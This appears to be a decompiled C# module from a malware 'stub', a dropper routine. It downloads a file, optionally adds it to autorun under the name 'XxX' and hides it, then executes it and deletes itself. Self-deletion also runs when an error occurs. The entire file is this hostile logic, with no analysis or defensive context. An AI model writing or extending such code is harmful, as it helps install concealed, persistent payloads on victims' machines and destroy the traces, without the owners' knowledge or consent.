using System;
using System.Diagnostics;

namespace Stub.Modules.InternalFuncs
{
	// Token: 0x02000009 RID: 9
	internal class InternalMain
	{
		// Token: 0x06000017 RID: 23 RVA: 0x00002C74 File Offset: 0x00000E74
		public static void Execute()
		{
			try
			{
				InternalAux.DownloadFile();
				bool autoRun = config.AutoRun;
				if (autoRun)
				{
					InternalAux.AddToAutoRun("XxX", config.FileLocation);
				}
				bool hideFile = config.HideFile;
				if (hideFile)
				{
					InternalAux.HideFile(config.FileLocation);
				}
				Process.Start(config.FileLocation);
				InternalAux.SelfRemove();
			}
			catch
			{
				InternalAux.SelfRemove();
			}
		}
	}
}
